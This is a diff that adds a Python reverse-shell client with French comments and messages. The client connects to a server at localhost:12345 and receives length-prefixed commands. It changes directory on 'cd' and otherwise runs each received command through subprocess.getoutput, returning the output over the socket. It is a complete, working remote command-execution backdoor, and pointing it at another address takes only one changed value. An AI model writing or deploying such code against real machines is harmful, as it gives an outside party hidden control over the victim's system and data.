@@ -1,0 +1,70 @@
+import socket
+import subprocess
+import struct
+import os
+
+ip = "localhost"
+port = 12345
+bufsize = 4096
+
+client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+try:
+    client.connect((ip, port))
+    print("connection reussite au serveur")
+
+except:
+    print("echec de connection avec le serveur")
+
+def send_message(client_socket, message):
+    # envoyer la longeur du message
+    longueur_message = len(message.encode())
+    client_socket.sendall(struct.pack("!I", longueur_message))
+    # envoyer a present le message
+    client_socket.sendall(message.encode())
+
+def receive_message(client_socket):
+    # recoit d'abord la longueur du message
+    get_data_len = client_socket.recv(4)
+    message_len = struct.unpack("!I", get_data_len)[0]
+
+    # reception du message proprement dit
+    message = b""
+    while len(message) < message_len:
+        chunk = message_len - len(message)
+        chunk_size = bufsize if chunk > bufsize else chunk
+        data = client_socket.recv(chunk_size)
+        message += data
+    return message.decode()
+
+while True:
+    command = receive_message(client)
+    print("serveur send", command)
+    if command == "":
+        continue
+
+
+    elif command.startswith("cd"):
+        repertoire = command.split(" ")[1]
+        try:
+            os.chdir(repertoire)
+            msg = f"current path {os.getcwd()}"
+            send_message(client, msg)
+        except:
+            msg = f"le repertoire {repertoire} n'existe pas"
+            send_message(client, msg)
+        continue
+
+
+    else:
+        # envoyer au moins un octect
+        output = subprocess.getoutput(command)
+        len_output = len(output.encode())
+        print("taille du message", len_output, "octects")
+        # envoyer au moins un octect
+        if len_output == 0:
+            len_output = 1
+
+        send_message(client, output)
+
+client.close()
+
